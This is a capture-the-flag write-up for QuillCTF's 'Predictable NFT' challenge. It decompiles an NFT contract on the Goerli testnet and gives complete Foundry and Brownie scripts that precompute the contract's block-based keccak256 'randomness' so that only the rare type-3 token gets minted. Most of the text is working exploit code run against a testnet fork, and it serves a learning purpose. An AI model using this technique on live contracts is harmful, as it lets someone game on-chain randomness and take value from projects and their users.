---
title: Predictable NFT - Quillctf
#image: 'https://quillctf.super.site/_next/image?url=https%3A%2F%2Fassets.super.so%2Fa799195c-7c08-410a-9254-50dd9f21a772%2Fimages%2F6e1d60ba-8a0b-4588-9413-fb30d1dfee82%2F1374FC4A-D8B8-4767-B951-ED874164BB64.png&w=1920&q=80'
created: 2023-04-18
tags:
    - 'smart contracts'
    - 'web3'
    - 'brownie'
    - 'quillctf'
---

# Predictable NFT - Quillctf

- For this one we don't have contracts but we have an address `0xfd3cbdbd9d1bbe0452efb1d1bffa94c8468a66fc`. We can decompile it to see it's contents. Decomplied version from `etherscan`.
```py
# Palkeoramix decompiler. 

def storage:
  id is uint256 at storage 0
  tokens is mapping of uint256 at storage 1

def tokens(uint256 _param1): # not payable
  require calldata.size - 4 >=ΓÇ▓ 32
  return tokens[_param1]

def id(): # not payable
  return id

#
#  Regular functions
#

def _fallback() payable: # default function
  revert

def mint() payable: 
  if call.value != 10^18:
      revert with 0, 'show me the money'
  if id > id + 1:
      revert with 0, 17
  id++
  if sha3(id, caller, block.number) % 100 > 90:
      tokens[stor0] = 3
  else:
      if sha3(id, caller, block.number) % 100 <= 80:
          tokens[stor0] = 1
      else:
          tokens[stor0] = 2
  return id
```
- Decompiled from https://library.dedaub.com/decompile. I renamed the vars to make it more readable. 
```js
pragma solidity ^0.8.19;

contract NFT {
    uint256 private _id; // STORAGE[0x0]
    mapping(uint256 => uint256) private _tokens; // STORAGE[0x1]

    receive() external payable {
        revert();
    }

    function mint() public payable {
        require(1 ether == msg.value, "show me the money");
        require(_id <= 1 + _id, "Panic(17)"); // arithmetic overflow or underflow
        _id += 1;
        require(100 != 0, "Panic(18)"); // division by zero
        uint256 v0;
        uint256 v1;
        uint256 v2;
        uint256 v3;
        if (
            uint256(
                keccak256(abi.encodePacked(_id, msg.sender, block.number))
            ) %
                100 <=
            90
        ) {
            if (
                uint256(
                    keccak256(abi.encodePacked(_id, msg.sender, block.number))
                ) %
                    100 <=
                80
            ) {
                v0 = v1 = 1;
            } else {
                v0 = v2 = 2;
            }
        } else {
            v0 = v3 = 3;
        }
        _tokens[_id] = v0;
    }

    function tokens(uint256 _id) public view returns (uint256) {
        require(msg.data.length - 4 >= 32);
        return _tokens[_id];
    }

    function id() public view returns (uint256) {
        return _id;
    }
}

```

- Our objective is to mint only `always mint the Superior ones` i.e. only mint type `3` NFTs. So we have a mint fn. & 2 other fns. `tokens` & `id` which returns the `type` & `id` of an NFT respectively. 
- Our main focus is the `mint()` fn. The first `if` statement checks wether `uint256` of `keccak256` of hash `_id, msg.sender, block.number` parameters has the last `2` digits are less than or equal to `90` if so then it checks if it's less than or equal to `80` or not. If so then mint type `1` else mint type `2` or if none of those mint `3`. So we have to check if the unsigned int has the last 2 digits greater than `90`, only then we can mint type `3` NFTs. 
```js
if (uint256(keccak256(abi.encodePacked(_id, msg.sender, block.number))) % 100 <= 90) {
    if (uint256(keccak256(abi.encodePacked(_id, msg.sender, block.number))) % 100 <= 80) {
        v0 = v1 = 1;
    } else {
        v0 = v2 = 2;
    }
} else {
    v0 = v3 = 3;
}
_tokens[_id] = v0;
```

- So I have written solutions in `brownie` & `foundry`. 

# Foundry
Let's see the `foundry` one first. To make things easy I used an `interfce` to work with the deployed contract since we don't have the `abi` but we do know the functions.Here is the `interface`. 
- `INFT.sol`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface INFT {
    function mint() external payable;

    function tokens(uint256 _id) external view returns (uint256);

    function id() external view returns (uint256);
}
```
- Simple basic `interface` nothing fancy about this. Now let's see the solution.
- `Hack.t.sol`
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/INFT.sol";
import "forge-std/console.sol";

contract PredictableNFTTest is Test {
    INFT nft;

    address hacker = address(0x1337);

    function setUp() public {
        vm.createSelectFork(
            "https://goerli.infura.io/v3/<api_key>"
        );
        vm.deal(hacker, 1 ether);
        nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
    }

    function test() public {
        vm.startPrank(hacker);
        uint mintedId;
        uint currentBlockNum = block.number;

        // console.log(msg.sender);
        // console.log(address(hacker));

        mintedId = nft.id();
        // console.log(mintedId);

        // Mint a Superior one, and do it within the next 100 blocks.
        for (uint i = 0; i < 100; i++) {
            vm.roll(currentBlockNum);

            // ---- hacking time ----
            uint256 jadu = uint256(
                keccak256(
                    abi.encode(mintedId + 1, address(hacker), block.number)
                )
            );
            if (jadu % 100 > 90) {
                //console.log(mintedId);
                //console.log(address(hacker));
                //console.log(block.number);
                //console.log(jadu);

                nft.mint{value: 1 ether}();
                console.log("Minted ID: ", nft.id());
                console.log("Minted Rank: ", nft.tokens(nft.id()));
                break;
            }

            currentBlockNum++;
        }

        // get rank from `mapping(tokenId => rank)`
        // (, bytes memory ret) = nft.call(
        //     abi.encodeWithSignature("tokens(uint256)", mintedId)
        // );
        // uint mintedRank = uint(bytes32(ret));
        mintedId = nft.id();
        uint mintedRank = nft.tokens(mintedId);

        assertEq(mintedRank, 3, "not Superior(rank != 3)");
    }
}
```

- We have our imports as usual. I'm importing the `INFT` interface as well. Then in the Test contract we are setting up the interface instance & hacker account. First we are forking `goerli` so that we can work locally with out api. Then we are loading the contract from the address like this `nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);`. Our goal is to mint the NFT within 100 blocks. So in the `test()` we have a `for` loop to check so. Now as I mentioned to mint type `3` we need the ans to be `>` 90. We can literally check each iteration to see the result of the hash. 
- We are taking a variable of type uint256 `jadu` & just copy pasting the check expect I'm using `abi.encode`, why? That's because `abi.encodePacked` does't add any padding & if 2 dynamic data types are together then it can lead to `hash collision` to high probability the original contract haven't used this. Moving on we are checking if the last 2 digits of the `jadu` var is `>` or not. Something `%` 100 == `last 2 digits`

![](assets/p-nft1.png)

- If so then only we are going to mint because as we already know the outcome so know we are going to mint type `3` NFT. The rest is for debugging purpose. The `assert` statement is checking if the type is `3` or not. So let's run it.
- Command:
```py
forge test --match-path test/hack.t.sol -vvv
```

![](assets/p-nft2.png)


# Brownie
- Here is the `attack.py` script.
```py
#!/usr/bin/python3
from brownie import interface, web3, accounts, chain
from scripts.helpful_scripts import get_account
from colorama import Fore
from eth_abi import encode
from eth_abi.packed import encode_packed


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack():
    nft = interface.INFT("0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC")

    # print(dir(nft))
    attacker = accounts.at(
        "0x0000000000000000000000000000000000001337", force=True
    )  # get_account()

    # send 1 ETH to attacker
    admin = get_account()
    admin.transfer(attacker, "1 ether").wait(1)

    # print(web3.eth.blockNumber)
    # print(attacker.address)
    # exit()
    nft_id = nft.id()
    # print(nft_id)

    for _ in range(100):
        encoded_data = encode(
            ["uint256", "address", "uint256"],
            [
                nft_id + 1,
                attacker.address,
                web3.eth.blockNumber,
            ],
        )
        u256 = web3.toInt(web3.keccak(encoded_data))

        # print(u256)
        if (u256 % 100) > 90:
            nft.mint({"from": attacker, "value": "1 ether"})
            print(u256)
            print(u256 % 100)
            break
        else:
            # make some fake tx to increase the blockNumber
            # jadu.transfer(attacker, "0.001 ether").wait(1)
            # mine next block
            chain.mine(1)
    # print(attacker.balance())

    nft_id = nft.id()
    print(f"{green}NFT Id: {blue}{nft_id}")
    print(f"{green}NFT type: {blue}{nft.tokens(nft_id)}")

    assert nft.tokens(nft_id) == 3


def main():
    attack()


if __name__ == "__main__":
    main()

```

- To fork `goerli` properly use this `brownie-config.yaml`. Where `$goerlifork` is a `environment` variable set to the `API` URL(`Alchemy` or `Infura`). 
```yaml
dotenv: .env
networks:
  default: goerli-fork-local
  goerli-fork-local:
    cmd_settings:
      # block to fork 8948253
      fork: $goerlifork@8948253
    verify: False
```

- And add this to you `~/.brownie/network-config.yaml`
```yml
- cmd: ganache-cli
  cmd_settings:
    accounts: 10
    evm_version: istanbul
    fork: goerli
    gas_limit: 12000000
    mnemonic: brownie
    port: 8545
  host: http://127.0.0.1
  id: goerli-fork-local
  name: Ganache-CLI (Goerli Fork Local)
  timeout: 120
```

- To add a account with your desired address we can do like this
```py
attacker = accounts.at(
        "0x0000000000000000000000000000000000001337", force=True
    ) 
```
- Then you have to send `ETH` to this. By default ganache will not give this account any `ETH`. That's it the logic is same.

![](assets/p-nft3.png)
